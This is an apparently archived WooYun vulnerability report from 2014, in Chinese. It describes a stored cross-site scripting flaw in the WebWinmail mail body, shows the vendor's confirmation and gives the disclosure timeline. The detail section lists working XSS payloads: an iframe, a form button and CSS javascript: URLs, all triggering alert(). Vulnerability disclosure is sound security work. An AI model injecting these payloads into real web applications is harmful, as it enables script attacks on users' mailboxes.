{"id": 51803, "wybug_id": "wooyun-2014-073313", "wybug_title": "webwinmail 邮件正文存储型xss测试", "wybug_corp": "http://www.magicwinmail.com", "wybug_author": "menmen519", "wybug_date": "2014-08-25 11:30", "wybug_open_date": "2014-11-23 11:32", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向公众公开  简要描述： webwinmail 邮件正文存储型xss测试 详细说明：  官方演示站点：http://demo.magicwinmail.com:6080然后发送邮件，到编辑器哪里，编辑然后提交内如如下：<iframe src=\"javascript:alert(2)\"><form><button formaction=javascript&colon;alert(1)>CLICKME<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE><style>@import 'javascript:alert(\"XSS\")';</style><style type=\"text/css\">.holder{background-image:url(\"javascript:alert('XSS')\");}</style><video poster=javascript:alert(1)//></video> // Opera 10.5以下有效提交如图所示：\n\n然后查看邮件如图所示：\n\n这里的点击框是第一条所产生的，奇怪的是单独写<form><button formaction=javascript&colon;alert(1)>CLICKME不会触发连着写：<iframe src=\"javascript:alert(2)\"><form><button formaction=javascript&colon;alert(1)>CLICKME 就会触发第一条规则后面的几条规则，我们打开ie看一下效果即可：\n\n速度可能得等一会儿才能触发，最后一个要去Opera 10.5以下有效，但是节点已经插入进去  完整的一个dom节点：通过firebug查看节点如下：\n\nok这里就不测试了    漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-08-30 09:54 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}